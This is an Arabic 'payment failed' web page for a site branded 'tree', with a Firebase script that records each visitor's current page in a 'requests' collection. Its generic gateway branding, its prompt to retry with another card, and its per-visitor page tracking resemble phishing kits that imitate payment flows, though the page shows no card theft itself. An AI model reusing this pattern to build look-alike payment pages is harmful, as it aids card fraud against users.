<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>فشل عملية الدفع | Payment Failed</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <style>
        body { display:flex; flex-direction:column; min-height:100vh; }
        .main-wrap { flex:1; display:flex; align-items:center; justify-content:center; padding:28px 16px 48px; }
        .fail-circle {
            width:90px; height:90px; border-radius:50%;
            background:rgba(248,113,113,0.12);
            border:2.5px solid #f87171;
            display:flex; align-items:center; justify-content:center;
            font-size:2.5rem; margin:0 auto 24px; color:#f87171;
            animation:shake .5s ease-in-out both;
        }
        @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-7px)} 40%{transform:translateX(7px)} 60%{transform:translateX(-5px)} 80%{transform:translateX(5px)} }
        .fail-msg { color:var(--text-muted); line-height:1.85; font-size:.97rem; margin:12px 0 28px; }
        .fail-msg span { display:block; margin-bottom:6px; }
        .btn-retry {
            display:block; width:100%; padding:14px;
            background:linear-gradient(135deg,#f87171,#ef4444);
            color:#fff; border:none; border-radius:12px;
            font-size:1rem; font-weight:700; cursor:pointer;
            text-align:center; text-decoration:none;
            font-family:'Cairo','Inter',sans-serif;
            transition:transform .15s,box-shadow .15s;
        }
        .btn-retry:hover { transform:translateY(-2px); box-shadow:0 6px 20px rgba(239,68,68,.35); color:#fff; }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<nav class="inner-nav">
    <a href="index.html" class="inner-nav__logo">tree</a>
    <div class="inner-nav__right">
        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
    </div>
</nav>

<div class="main-wrap">
    <div class="teal-card teal-card--narrow" style="width:100%;text-align:center;">
        <div class="card-body" style="padding-top:40px;padding-bottom:44px;">

            <div class="fail-circle">✕</div>

            <div class="section-title" style="margin-bottom:12px;color:#f87171;" data-i18n="failed.title">نعتذر</div>

            <div class="fail-msg">
                <span data-i18n="failed.msg1">نعتذر، لم نتمكن من معالجة عملية الدفع باستخدام البطاقة المدخلة.</span>
                <span data-i18n="failed.msg2">قد يكون السبب عدم كفاية الرصيد أو رفض من البنك المصدر.</span>
                <span data-i18n="failed.msg3">يرجى المحاولة باستخدام بطاقة أخرى أو التواصل مع البنك.</span>
            </div>

            <a href="payment.html" class="btn-retry" data-i18n="failed.btn_retry">المتابعة للدفع ↺</a>

            <a href="index.html" style="display:block;margin-top:14px;color:var(--text-muted);font-size:.9rem;text-decoration:none;" data-i18n="success.btn_home">العودة للرئيسية</a>

        </div>
    </div>
</div>

<div class="inner-footer" data-i18n="footer.secure">Secure Payment Gateway © 2024</div>

<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    if (userId) {
        db.collection("requests").doc(userId).update({ currentPage: 'فشل الدفع' }).catch(() => {});
    }
</script>
</body>
</html>
